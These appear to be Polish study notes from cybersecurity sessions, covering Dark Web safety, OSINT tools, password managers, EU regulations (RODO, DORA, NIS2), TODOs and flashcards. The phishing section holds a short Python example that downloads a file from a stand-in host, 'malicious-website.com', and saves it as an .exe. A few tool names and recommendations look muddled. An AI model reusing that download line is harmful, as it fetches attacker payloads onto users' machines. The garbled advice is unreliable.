
### 2.2 Bezpieczeństwo na Dark Webie 
- Operacje w Dark Webie wymagają szczególnego zabezpieczenia, w tym wykorzystania tuneli VPN oraz narzędzi służących do anonimowości.

## 3. 📝 Actions
TODO: Zarejestrować meeting na temat bezpieczeństwa danych osobowych.
TODO: Wydzielić dokumentację dotycząca cenzurowania danych wizualnych.
TODO: Przygotować materiały dotyczące poruszania się po Dark Webie w sposób bezpieczny.

## 4. 🧠 Flashcards
#flashcard Jakie są dwa główne ryzyka związane z przechowywaniem haseł? :: 1. Ujawnienie haseł 2. Utrata danych osobowych.
#flashcard Jakie są trzy poziomy internetu? :: Surface Web, Deep Web, Dark Web.
#flashcard Co należy zrobić przed zamieszczeniem danych osobowych w internecie? :: Zastosować cenzurowanie danych wizualnych.

## OSINT i Narzędzia do Analizy

### Przegląd
W części czwartej omawiane są narzędzia związane z portalami społecznościowymi i techniki Open Source Intelligence (OSINT). Zawiera to przegląd możliwości uzyskiwania informacji z platform społecznościowych.

### Termin
Zaproszenie do sesji OSINT na 30 października o godzinie 19:00.

## Narzędzia i Techniki

### Fake Person Generator
- Generuje tymczasowe e-maile.
- Potencjalne zagrożenia związane ze zdjęciami i danymi osobowymi.

### Weryfikacja Profilu
Zaleca się korzystanie z zewnętrznych mechanizmów do tworzenia profili, aby uniknąć problemów związanych z danymi.

### Analiza Przykładu Phishingu
Podczas analizy bezpieczeństwa, należy pamiętać, że złośliwe pliki mogą przyjmować legalny wygląd, co utrudnia identyfikację zagrożenia. 

```python
# Przykład ataku za pomocą Python
def download_file(url):
    response = requests.get(url)
    with open("malicious_file.exe", "wb") as file:
        file.write(response.content)

download_file("http://malicious-website.com/file")
```

## Aspekty Bezpieczeństwa
- **RODO**: Przechowywanie danych osobowych w przestrzeni cyfrowej wiąże się z obowiązkiem ochrony tych danych.
- **DORA i NIS2**: Kluczowe jest zapewnienie ciągłości działania i zabezpieczenia infrastruktur krytycznych przed atakami.

## 📝 Actions
TODO: Przeszkolenie dotyczące korzystania z narzędzi OSINT w kontekście analizy danych z portali społecznościowych.

## 📅 Calendar
SPOTKANIE: Narada OSINT - 30 października o 19:00. [Synced](https://www.google.com/calendar/event?eid=cnRvOXE2dnFjdnMwYTFsNWpsOHJubWFjc28gbWFyY2luLnVib2dpQG0)

## 🧠 Flashcards
#flashcard Co to jest OSINT? :: Open Source Intelligence, czyli inteligencja oparta na źródłach dostępnych publicznie.
#flashcard Jakie są zagrożenia związane z phishingiem? :: Możliwość pobrania złośliwego oprogramowania pod przykrywką legalnych plików.

## 📝 Actions
TODO: Zarejestrować się na szkolenie hacking plików na stronie szkoleniamaupasecuritum.pl.
TODO: Sprawdzić informacje o zniżkach na mediach społecznościowych.
TODO: Przeprowadzić testy penetracyjne dla aplikacji Bitwarden, jeśli zajdzie taka potrzeba.

## 📅 Calendar
TERMIN: 17 października - zakończenie konkursu na bilety. [Synced](https://www.google.com/calendar/event?eid=ZThzOTRtYm1yODIycXFmZTMyczk2bWdzbmMgbWFyY2luLnVib2dpQG0)

## 🔒 Bezpieczeństwo
Zaleca się korzystanie z menedżerów haseł, takich jak Bitwarden, ze względu na ich podejście do bezpieczeństwa i regularne testy penetracyjne. Przechowywanie haseł na kartkach jest preferowane w przypadku braku bezpieczniejszych metod.

### Rozwiązania do konwersji plików
Brak uniwersalnego narzędzia do konwersji plików. Ważne, aby wybierać lokalne, bezpieczne rozwiązania.

### OSINT i Virtual Machines
Zalecane do analizy OSINT:
- Tails - anonimizuje połączenia i nie przesyła danych.
- Huonix - dodatkowe bezpieczeństwo i anonimowość.
- Kali - użyteczne, ale nie pierwszego wyboru.

### Hacking
Użytkownicy są zachęcani do korzystania z narzędzi zabezpieczających, aby zminimalizować zagrożenia związane z cyberatakami, oraz do prowadzenia działań edukacyjnych na temat bezpieczeństwa.

## 🧠 Flashcards
#flashcard Jakie narzędzia polecasz do OSINTu? :: Tails, Huonix, Kali
#flashcard Jakie są wady przechowywania haseł w przeglądarce? :: Niska bezpieczeństwo
#flashcard Jaki menedżer haseł był rekomendowany? :: Bitwarden

## Powiązane notatki

- [[000_MOC_Cybersec]]
- [[000_MOC_Compliance]]
- [[000_MOC_Data_engineering]]
